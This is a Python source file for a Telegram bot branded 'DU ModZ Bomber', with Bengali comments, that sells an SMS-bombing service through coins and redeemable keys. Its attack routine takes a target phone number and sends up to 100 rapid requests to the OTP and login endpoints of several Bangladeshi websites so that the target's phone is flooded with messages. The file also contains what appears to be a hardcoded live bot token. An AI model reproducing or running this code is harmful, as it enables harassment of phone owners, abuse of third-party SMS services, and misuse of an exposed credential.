import telebot
import requests
import json
import os
import time
import threading
import random
import uuid
from telebot import types
from datetime import datetime

# --- কনফিগারেশন ---
TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
ADMIN_ID = 8504263842 
LOG_CHANNEL = "@sMsBotManagerDUModz" 
REQUIRED_CHANNEL = "@DemoTestDUModz" 
LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- ডাটাবেস হ্যান্ডলার ---
def load_db(file):
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump({}, f)
        return {}
    try:
        with open(file, 'r') as f: return json.load(f)
    except: return {}

def save_db(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=4)

# রিয়েল-টাইম লোড
users = load_db('users.json')
keys = load_db('keys.json')

# --- হেল্পার ফাংশনস ---
def send_log(text):
    try:
        bot.send_message(LOG_CHANNEL, f"✨ **System Log**\n⏰ {datetime.now().strftime('%H:%M:%S')}\n\n{text}")
    except: pass

def is_joined(user_id):
    try:
        status = bot.get_chat_member(REQUIRED_CHANNEL, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

def update_user_record(user):
    uid = str(user.id)
    if uid not in users:
        users[uid] = {
            "name": user.first_name,
            "username": f"@{user.username}" if user.username else "N/A",
            "status": "Active", # Active, Blocked, Lifetime
            "coins": 50,
            "sent": 0,
            "join_date": datetime.now().strftime('%Y-%m-%d')
        }
        save_db('users.json', users)
        send_log(f"🆕 **New User Registered!**\nName: {user.first_name}\nID: `{uid}`")
    return users[uid]

# --- মেইন মেনু ---
def main_menu(message, text=""):
    uid = str(message.from_user.id)
    u = users.get(uid)
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Start Attack", callback_data="bomb"),
        types.InlineKeyboardButton("👤 My Profile", callback_data="profile"),
        types.InlineKeyboardButton("🔑 Redeem Key", callback_data="recharge"),
        types.InlineKeyboardButton("📢 Channel", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@','')}")
    )
    
    msg_text = text if text else f"🔥 **Welcome to DU ModZ Bomber**\n\n👤 User: `{u['name']}`\n💰 Coins: `{u['coins']}`\n⚡ Status: `{u['status']}`"
    bot.send_photo(message.chat.id, LOGO_URL, caption=msg_text, reply_markup=markup)

# --- কমান্ডস ---
@bot.message_handler(commands=['start'])
def start(message):
    update_user_record(message.from_user)
    if not is_joined(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel to Unlock", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@','')}"))
        bot.send_message(message.chat.id, "❌ **Access Denied!**\nYou must join our channel to use this bot.", reply_markup=markup)
        return
    main_menu(message)

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID: return
    help_text = (
        "👑 **Premium Admin Panel**\n\n"
        "📊 `/stats` - সিস্টেম স্ট্যাটাস\n"
        "👥 `/users` - ইউজার লিস্ট\n"
        "⚙️ `/setstatus [ID] [Status]` - (Active/Blocked/Lifetime)\n"
        "💰 `/addcoins [ID] [Amount]` - কয়েন দিন\n"
        "🔑 `/gen [Amount]` - রিচার্জ কি বানান\n"
        "📢 `/broadcast [Msg]` - সবাইকে মেসেজ"
    )
    bot.reply_to(message, help_text)

# --- অ্যাডমিন ফাংশনালিটি ---
@bot.message_handler(commands=['gen'])
def gen_key(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        amount = int(message.text.split()[1])
        new_key = f"DU-{uuid.uuid4().hex[:8].upper()}"
        keys[new_key] = amount
        save_db('keys.json', keys)
        bot.reply_to(message, f"✅ **Key Generated:** `{new_key}`\n💰 Value: {amount} Coins")
    except: bot.reply_to(message, "Usage: `/gen [Coins]`")

@bot.message_handler(commands=['stats'])
def stats(message):
    if message.from_user.id != ADMIN_ID: return
    total_u = len(users)
    total_keys = len(keys)
    bot.reply_to(message, f"📊 **System Stats**\n\nTotal Users: {total_u}\nUnused Keys: {total_keys}")

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if message.from_user.id != ADMIN_ID: return
    msg = message.text.replace("/broadcast ", "")
    count = 0
    for uid in users:
        try:
            bot.send_message(uid, f"📢 **Announcement from Admin**\n\n{msg}")
            count += 1
        except: pass
    bot.reply_to(message, f"✅ Broadcast sent to {count} users.")

# --- কলব্যাক হ্যান্ডলার ---
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    uid = str(call.from_user.id)
    u_data = users.get(uid)

    if call.data == "profile":
        profile_txt = (
            f"👤 **User Profile**\n"
            f"━━━━━━━━━━━━━━\n"
            f"ID: `{uid}`\n"
            f"Status: `{u_data['status']}`\n"
            f"Coins: `{u_data['coins']}`\n"
            f"Total Sent: `{u_data['sent']}`\n"
            f"Joined: `{u_data['join_date']}`"
        )
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, profile_txt)

    elif call.data == "recharge":
        msg = bot.send_message(call.message.chat.id, "🔑 **Enter your Recharge Key:**")
        bot.register_next_step_handler(msg, redeem_process)

    elif call.data == "bomb":
        if u_data['status'] == "Blocked":
            bot.send_message(call.message.chat.id, "🚫 **You are Blocked!**\nContact @Admin for help.")
            return
        if u_data['status'] != "Lifetime" and u_data['coins'] < 5:
            bot.send_message(call.message.chat.id, "⚠️ **Minimum 5 coins required!**")
            return
        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Number (11 Digit):**")
        bot.register_next_step_handler(msg, get_number)

# --- বোম্বিং লজিক ---
def get_number(message):
    num = message.text
    if len(num) == 11 and num.isdigit():
        msg = bot.send_message(message.chat.id, "🔢 **How many SMS? (Max 100):**")
        bot.register_next_step_handler(msg, lambda m: start_attack(m, num))
    else:
        bot.send_message(message.chat.id, "❌ Invalid Number!")

def start_attack(message, num):
    try:
        amount = int(message.text)
        if amount > 100: amount = 100
        uid = str(message.from_user.id)
        
        # প্রতিটি রিকোয়েস্টে ৫ কয়েন কাটবে
        if users[uid]['status'] != 'Lifetime':
            users[uid]['coins'] -= 5
            save_db('users.json', users)

        p_msg = bot.send_message(message.chat.id, "🔄 **Initializing Servers...**")
        threading.Thread(target=bombing_engine, args=(uid, num, amount, p_msg)).start()
    except: bot.send_message(message.chat.id, "❌ Invalid Amount!")

def bombing_engine(uid, num, amount, p_msg):
    success = 0
    animations = ["🌑", "🌒", "🌓", "🌔", "🌕"]
    
    # API List
    apis = [
        "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        "https://bikroy.com/data/relative/login-with-otp",
        "https://www.shajgoj.com/wp-admin/admin-ajax.php",
        "https://pathao.com/wp-admin/admin-ajax.php"
    ]

    for i in range(1, amount + 1):
        try:
            # এনিমেশন ইফেক্ট
            anim = animations[i % len(animations)]
            progress = "▰" * (i // 10) + "▱" * (10 - (i // 10))
            
            if i % 5 == 0:
                bot.edit_message_text(
                    f"🚀 **DU ModZ Attacking...**\n\n"
                    f"📱 Target: `{num}`\n"
                    f"📊 Progress: `[{progress}]` {i}%\n"
                    f"⚡ Status: {anim} Sending...",
                    p_msg.chat.id, p_msg.message_id
                )
            
            # API Request
            res = requests.post(random.choice(apis), data={"phone": num, "number": num}, timeout=5)
            if res.status_code == 200: success += 1
            time.sleep(0.1) # আল্ট্রা ফাস্ট স্পিড
        except: pass

    # আপডেট ডাটা
    users[uid]['sent'] += success
    save_db('users.json', users)
    
    # ফাইনাল মেসেজ
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🚀 Send Again", callback_data="bomb"))
    
    final_txt = (
        f"✅ **Attack Completed!**\n\n"
        f"📱 Target: `{num}`\n"
        f"📨 Success: `{success}`\n"
        f"💰 Coins Used: `5` (Flat)\n"
        f"👤 User: {users[uid]['name']}"
    )
    bot.edit_message_text(final_txt, p_msg.chat.id, p_msg.message_id, reply_markup=markup)
    send_log(f"🚀 **Attack Finished!**\nUser: {uid}\nTarget: {num}\nSuccess: {success}")

# --- কি রিডিম প্রসেস ---
def redeem_process(message):
    key = message.text.strip()
    uid = str(message.from_user.id)
    if key in keys:
        amount = keys[key]
        users[uid]['coins'] += amount
        del keys[key]
        save_db('users.json', users)
        save_db('keys.json', keys)
        bot.send_message(message.chat.id, f"✅ **Success!**\n{amount} coins added to your account.")
    else:
        bot.send_message(message.chat.id, "❌ **Invalid or Used Key!**")

# --- রান বোট ---
if __name__ == "__main__":
    print(">>> DU ModZ Bot is Running Successfully...")
    send_log("🚀 **Bot is Online & Security Shield Active!**")
    bot.infinity_polling()
